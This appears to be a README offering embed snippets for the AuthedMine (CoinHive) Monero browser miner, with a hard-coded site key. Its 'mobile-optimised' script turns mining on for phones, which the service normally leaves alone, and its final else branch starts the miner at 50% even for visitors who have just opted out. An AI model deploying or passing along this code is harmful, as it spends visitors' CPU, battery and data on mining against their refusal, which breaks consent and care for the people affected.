# AuthedMine for Mobile Browsers

AuthedMin is usually disabled for mobile browsers; however, this script enables the more heavily throttled use of AuthedMine on mobile browsers.

## Normal [AuthedMine Monero Miner]

```html
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
    var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
    // Only start on non-mobile devices and if not opted-out in the last 3600 seconds:
    if (!miner.isMobile() && !miner.didOptOut(3600)) {
        miner.start();
    }
</script>
```

Mobile-Optimised [AuthedMine Monero Miner]

```html
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
    var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
    if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
        // desktop @ 70%
        var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
        miner.start();
    } else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
           // mobile @ 30%
        var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
        miner.start();
    } else {
        // unknown device @ 50%
        var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
        miner.start();
    }
</script>
```

[AuthedMine Monero Miner]: https://authedmine.com
